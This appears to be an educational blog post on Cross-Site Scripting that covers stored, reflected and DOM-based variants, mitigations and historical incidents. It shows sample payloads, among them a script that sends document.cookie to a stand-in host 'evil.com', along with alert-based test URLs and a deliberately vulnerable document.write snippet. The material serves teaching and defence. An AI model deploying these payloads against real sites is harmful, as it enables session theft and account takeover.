---
title: "Cross-Site Scripting (XSS): OWASP Top 10 & Real-World Exploitation"
date: 2025-07-31
layout: post
tags: [OWASP, Web Security, XSS]
---

<style>
  .toc-box {
    background-color: #f9f9f9;
    padding: 20px;
    border-left: 5px solid #007acc;
    border-radius: 6px;
    margin-bottom: 30px;
  }
</style>

<div class="toc-box">
<strong>Table of Contents</strong>
<ul>
  <li><a href="#what-is-cross-site-scripting-xss">What is Cross-Site Scripting (XSS)?</a></li>
  <li><a href="#types-of-xss">Types of XSS</a>
    <ul>
      <li><a href="#1-stored-xss">1. Stored XSS</a></li>
      <li><a href="#2-reflected-xss">2. Reflected XSS</a></li>
      <li><a href="#3-dom-based-xss">3. DOM-Based XSS</a></li>
    </ul>
  </li>
  <li><a href="#how-xss-attacks-work">How XSS Attacks Work</a></li>
  <li><a href="#real-world-examples">Real-World Examples</a></li>
  <li><a href="#general-mitigation-strategies">General Mitigation Strategies</a></li>
  <li><a href="#conclusion">Conclusion</a></li>
  <li><a href="#references">References</a></li>
</ul>
</div>

---

## What is Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) is a client-side code injection vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. When executed in the victim’s browser, these scripts can steal cookies, session tokens, sensitive data, or perform actions on behalf of the user. XSS is included in the [OWASP Top 10](https://owasp.org/Top10) due to its high frequency and impact.

---

## Types of XSS

### 1. Stored XSS

**Definition:**  
Stored XSS occurs when malicious scripts are permanently saved on the target server (e.g., in a database, comment section, forum post). Any user who accesses the affected page will automatically execute the malicious code.

**How it works:**
1. Attacker submits malicious JavaScript into an input field that gets stored in the application’s database.
2. When another user loads the page, the stored script is included in the page’s HTML and executed by the browser.
3. The script can perform actions like stealing cookies, keylogging, or redirecting the user to malicious sites.

**Example payload & Mitigation:**

```html
<script>fetch('https://evil.com?cookie=' + document.cookie)</script>

**Mitigation:**  
Sanitize and validate all user inputs before storing them; use context-aware output encoding; avoid directly inserting untrusted data into HTML; apply a strict Content Security Policy (CSP).


### 2. Reflected XSS

**Definition:**  
Reflected XSS occurs when malicious scripts are embedded in a URL or request and reflected back to the browser in the server’s response without proper sanitization.

**How it works:**
1. Attacker crafts a malicious link containing JavaScript code in a parameter.
2. Victim clicks the link and sends a request to the vulnerable application.
3. The application reflects the malicious input in its response, which the browser executes.

**Example payload in URL:**
```
https://example.com/search?q=<script>alert('XSS')</script>
```

**Mitigation:**  
Sanitize and encode all user inputs before reflecting them in responses; use frameworks that automatically escape output; avoid dynamically generating HTML from untrusted data; implement CSP to block inline scripts.

---

### 3. DOM-Based XSS

**Definition:**  
DOM-Based XSS happens when the client-side JavaScript modifies the DOM based on untrusted data without proper sanitization, leading to script execution without any server-side involvement.

**How it works:**
1. Attacker crafts a malicious payload that manipulates the page’s DOM via URL fragments, query parameters, or other sources.
2. The vulnerable JavaScript code inserts this data directly into the page without escaping.
3. The browser executes the malicious code.

**Example vulnerable code:**
```javascript
document.write(location.hash);
```

**Example attack URL:**
```
https://example.com/page#<script>alert('XSS')</script>
```

**Mitigation:**  
Avoid dangerous DOM manipulation methods like `document.write()` and `innerHTML` with untrusted data; use safe DOM APIs like `textContent` or `setAttribute()`; sanitize inputs with trusted libraries (e.g., DOMPurify); implement CSP to prevent execution of injected scripts.

---

## How XSS Attacks Work

1. **Injection:** The attacker injects malicious JavaScript into a vulnerable page.
2. **Execution:** The victim’s browser renders the page and runs the script.
3. **Impact:** The attacker can steal session cookies, perform actions as the user, or spread malware.

---

## Real-World Examples

- **MySpace Samy Worm (2005):** A self-replicating XSS worm that spread to over 1 million profiles in 24 hours.
- **British Airways Breach (2018):** Malicious JavaScript was injected to steal payment details from thousands of customers.

---

## General Mitigation Strategies

- Validate and sanitize all user inputs on both client and server.
- Use context-specific output encoding.
- Enforce a strong Content Security Policy (CSP).
- Avoid unsafe JavaScript functions and DOM manipulation methods.
- Use security features provided by frameworks.
- Regularly test for XSS vulnerabilities using automated scanners and manual penetration testing.

---

## Conclusion

XSS is a critical vulnerability that undermines user trust and can cause severe data breaches. By implementing proper input handling, output encoding, and browser-based security controls, developers can significantly reduce the risk of exploitation.

---

## References

- [OWASP: Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger: XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)


